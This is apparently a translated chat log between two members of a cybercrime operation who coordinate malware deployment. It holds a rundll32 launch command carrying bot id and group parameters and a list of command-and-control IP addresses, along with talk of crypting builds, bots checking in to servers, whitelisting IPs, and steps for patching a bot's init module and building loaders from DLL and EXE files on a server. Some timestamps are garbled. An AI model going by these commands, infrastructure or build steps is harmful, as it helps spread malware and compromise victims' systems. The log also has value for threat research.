[29.11.21 11:07:52] angelo: for clarity Rantip put RAndoll32 and the command is the same with the new ips DllRegisterServer --id %id% --group %group% --ip 45.58.53.100,65.108.52.202,185.45.192.196,80.71.158.23,192.144.39.199,198.252.108.108,45.42.201.169,172.83.155.186,45.42.201.179
[29.11.21 11:09:13] collin: Yeah.
[29.11.21 11:09:36] collin: you tapped vntz?
[29.11.21 11:09:48] angelo: one sec.
[29.11.21 11:10:26] angelo: yes
[29.11.21 11:13:25] angelo: krypt check and give adam as I understand
[29.11.21 11:19:11] collin: crypt vntz?
[29.11.21 11:19:50] angelo: I checked the source
[29.11.21 11:19:59] angelo: 5 minutes
[29.11.21 11:20:05] angelo: check prt
[29.11.21 11:20:30] angelo: I don't understand why that vntz source stopped working on friday, there was no prerequisite
[29.11.21 11:34:09] angelo: and for crypt vnts bk and randl32 are equivalent?
[29.11.21 11:35:46] collin: both should work
[29.11.21 12:26:52] angelo: slid by tric
[29.11.21 12:26:58] angelo: team lead
[30.11.21 13:57:43] angelo: hi !

[03.12.21 14:17:30] collin: hi!
[03.12.21 14:17:46] angelo: derek gave it to me to check.
[03.12.21 14:17:48] angelo: 11 group
[03.12.21 14:17:57] angelo: silence
[03.12.21 14:18:06] angelo: mb long knock ?
[03.12.21 14:18:38] collin: about 10-15 minutes
[03.12.21 14:19:04] collin: maybe new ipi, not in white list?
[03.12.21 14:19:18] angelo: but he's still supposed to knock like that time
[03.12.21 14:19:20] angelo: without idi
[03.12.21 14:19:26] angelo: 185.176.220.233
[03.12.21 14:19:29] angelo: isn't it?
[03.12.21 14:20:50] collin: he knocked 20 minutes ago
[03.12.21 14:21:23] collin: the address was on the blacklist, added it
[03.12.21 14:21:30] angelo: what the
[03.12.21 14:21:37] angelo: I kinda started it 10 minutes ago
[03.12.21 14:22:54] collin: 4 minutes ago last knock
[03.12.21 14:23:03] angelo: ok
[12/03/221 14:23:06] angelo: thanks !
[03.12.21 14:23:08] collin: for some reason in the stats in the hanypotas is not reflected
[03.12.21 14:23:21] angelo: well, that's the times I knocked out of the blacklist
[03.12.21 14:24:48] collin: something must have gone wrong on the server side
[03.12.21 14:25:05] collin: I knocked 7 and 10 minutes ago, there are reports in the main log
[03.12.21 14:25:38] angelo: the main thing is knocking, gluing was checked
[06.12.21 14:11:58] angelo: hi.
[06.12.21 14:17:51] collin: hi!
[06.12.21 14:18:06] angelo: ran two glues
[06.12.21 14:18:12] angelo: I think they went black
[06.12.21 14:18:19] angelo: at 83.136.182.35
[06.12.21 14:23:29] collin: didn't knock, added to whitelist
[06.12.21 14:23:36] collin: main addresses on the builds are on abuzz, it takes a long time to knock
[06.12.21 14:23:48] collin: checked now - 45 minutes to bang
[06.12.21 14:23:58] angelo: 45 0_0
[06.12.21 14:24:01] angelo: but it is possible ?
[06.12.21 14:24:06] angelo: long time
[06.12.21 14:25:55] collin: derek said okay
[06.12.21 14:26:16] angelo: looking at them, I think everything is okay)
[08.12.21 09:13:33] collin: hi!
[12/27/221 07:44:59] collin: hi!
[12/27/221 07:45:59] angelo: Hi!
[27.12.21 07:46:20] collin: about anubis, do you patch init module via "builder"?
[27.12.21 07:46:29] collin: this:
[27.12.21 07:46:31] collin: ``
To create builds (bot init file)
1) go to the folder with the builder\builder\
2) edit the \builder\config.bat file

PRJ_NAME - project name as in the admin panel
UPDATE_VER - version of the update
URL_PATH - path to push to
HOST_LIST - list of domains which will be triggered

ZIP_PASS is a optional parameter that sets the password for the archive to be created
```
[27.12.21 07:46:54] angelo: no module, only bot
[27.12.21 07:47:04] collin: Who does this?
[27.12.21 07:47:13] angelo: hmm
[27.12.21 07:47:27] angelo: sec
[12/27/221 07:47:46] angelo: hold on.
[12/27/221 07:47:54] angelo: me)
[27.12.21 07:48:16] collin: do you want me to send you collected modules?
[27.12.21 07:48:17] collin: binary
[27.12.21 07:48:27] collin: loader and init
[27.12.21 07:48:34] collin: I built them at Bezdar's request
[27.12.21 07:48:39] angelo: for me yes
[27.12.21 07:48:41] collin: from the sources the coder gave me
[27.12.21 07:49:21] angelo: sorry, bro, it's been a sleepless night, I'm working on it like an alarm clock
[27.12.21 07:49:48] angelo: did you make bot and loader ?
[27.12.21 07:50:03] angelo: now need to update through the admin anubis
[27.12.21 07:50:11] collin: loader and init only
[27.12.21 07:50:14] collin: botpack I have no sources

[27.12.21 07:58:15] collin: hold the binary, try to prepare them
[27.12.21 08:02:21] angelo: let's make it quick
[27.12.21 08:02:32] angelo: did you build loeder ?
[27.12.21 08:02:35] angelo: and the bot itself ?
[27.12.21 08:02:43] collin: loader and init modules
[27.12.21 08:03:00] collin: without botpack
[27.12.21 08:03:44] angelo: Bear with me
[27.12.21 08:03:56] angelo: what is init ?
[27.12.21 08:04:18] angelo: loader is created from the second admin
[27.12.21 08:04:54] angelo: i'm fuckin' tight now
[27.12.21 08:04:55] collin: I have sources for two modules looder and init
[27.12.21 08:04:58] collin: it's the init that gets patched
[27.12.21 08:05:06] collin: you must know more about this bot than I do.)
[27.12.21 08:05:14] collin: I can send you all the source package + docks, the ones you gave me
[27.12.21 08:05:30] angelo: let me check the files
[27.12.21 08:09:23] angelo: well, two yafels I know
[27.12.21 08:09:29] angelo: they were in the builder for the bot build
[27.12.21 08:09:39] angelo: lib I don't know why or where they are from
[27.12.21 08:09:59] collin: i don't know it either, it was bundled
[27.12.21 08:10:11] angelo: ) let's see
[27.12.21 08:10:46] collin: about libs in my docks...
[27.12.21 08:17:37] angelo: yeah, we all don't understand what this build was for
[27.12.21 08:17:44] angelo: I'll check with Bezdar.
[12/27/221 08:18:34] collin: `[12/24/2021 12:14:30] <bezdar> at least rebuild the loeder from what you have
[27.12.21 08:18:51] collin: well, he wrote, I told him what I have - asked to make what I have...
[27.12.21 08:20:12] angelo: yeah, a little more clarity
[27.12.21 08:20:17] angelo: the question was about the lowader
[27.12.21 08:23:10] angelo: were there any water data during build?
[27.12.21 08:23:20] angelo: domains/vps
[27.12.21 08:23:56] collin: I don't have any
[27.12.21 08:24:05] collin: you must specify them when you patch module init
[27.12.21 08:24:29] angelo: that's the whole question
[27.12.21 08:24:32] angelo: now
[27.12.21 08:36:33] angelo: send me the manual
[27.12.21 08:36:54] collin: instruction about what?
[27.12.21 08:37:05] angelo: what you were sent
[27.12.21 08:37:07] angelo: what is it
[27.12.21 08:37:21] angelo: you got to figure out where to throw the source code on the looder

```
[27.12.21 08:42:32] angelo: here's the answer
[27.12.21 08:42:34] angelo: 2) take the files
\{bin\RELEASE\loader_dll_64.dll
\bin\RELEASE\loader_exe_64.exe
3) copy (replace existing) them to the server in the folder
/mnt/work/loader_v2/storage/loader/
4) after that you can build the loader in its admin area
[14.02.22 15:01:43] angelo: hi !
